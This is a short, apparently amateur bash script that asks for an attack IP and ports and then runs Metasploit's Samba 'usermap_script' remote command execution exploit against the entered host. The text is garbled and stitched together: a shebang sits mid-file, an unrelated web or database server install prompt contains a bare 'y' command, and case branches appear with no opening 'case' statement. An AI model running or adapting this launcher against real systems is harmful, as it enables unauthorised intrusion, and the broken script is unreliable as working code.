while true; do
echo "Enter Your Attack IP: "
read ip

echo "Enter The LPORT AKA Local Port: "
read lport

echo "Enter Attack Port AKA RPORT: "
read rport

# Test comment
#!/bin/bash

echo -n "Would you like to install a Web Server or Database Server?... Enter 1 for Web or 2 for Database: "
read VAR
	if [[ $VAR = 1 ]]; then
      		y
	fi
	if [[ $VAR = 2 ]]; then
    		sudo apt install mysql-server-8.0 -y
	fi
done
    
        [Yy]* ) msfconsole -q -x "use exploit/multi/samba/usermap_script; set rhost $ip; set lport $lport; exploit;"; break;;
	[Nn]* ) break;;
        * ) echo "Please Enter Yes or No.";;
    esac
done
